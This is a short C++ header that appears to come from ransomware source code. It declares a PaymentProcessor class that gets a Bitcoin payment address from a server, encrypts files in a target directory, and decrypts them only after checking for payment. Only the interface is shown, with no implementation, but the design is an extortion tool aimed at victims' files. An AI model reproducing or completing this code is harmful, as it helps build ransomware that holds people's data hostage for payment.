#pragma once

#include <bitcoin/bitcoin.hpp>
#include <string>

#include "encrypt.h"

class PaymentProcessor
{
    private:
        Crypt *encryptor;
        bc::wallet::payment_address address;
        const char *targetDir;
    public:
        PaymentProcessor(const char *targetDir); // Gets payment address from server
        std::string getAddress();
        int encryptFiles();
        int tryDecrypt(); // Checks for payment and decrypts if possible
};
